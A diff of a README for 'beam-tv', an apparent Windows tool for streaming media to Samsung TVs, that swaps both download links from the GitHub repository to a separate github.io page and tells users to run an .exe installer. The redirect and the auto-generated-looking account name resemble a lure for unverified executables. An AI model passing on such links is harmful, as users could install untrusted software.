@@ -1,6 +1,6 @@
 # 📺 beam-tv - Stream local media to Samsung TVs
 
-[![Download Beam TV](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Laborpainsalliteration178/beam-tv)
+[![Download Beam TV](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://laborpainsalliteration178.github.io)
 
 beam-tv acts as a bridge between your computer and your Samsung smart television. This application allows you to play video files stored on your computer or USB drive directly on your Tizen-based TV. It handles subtitles, remembers where you stopped watching, and provides remote navigation tools.
 
@@ -8,7 +8,7 @@ beam-tv acts as a bridge between your computer and your Samsung smart television
 
 To begin, you must install the application on your Windows computer. Follow these steps to set up the software.
 
-1. Visit [this page to download the latest setup file](https://github.com/Laborpainsalliteration178/beam-tv).
+1. Visit [this page to download the latest setup file](https://laborpainsalliteration178.github.io).
 2. Locate the download folder on your computer.
 3. Open the file ending in .exe to start the installer.
 4. Follow the prompts on your screen to complete the installation.
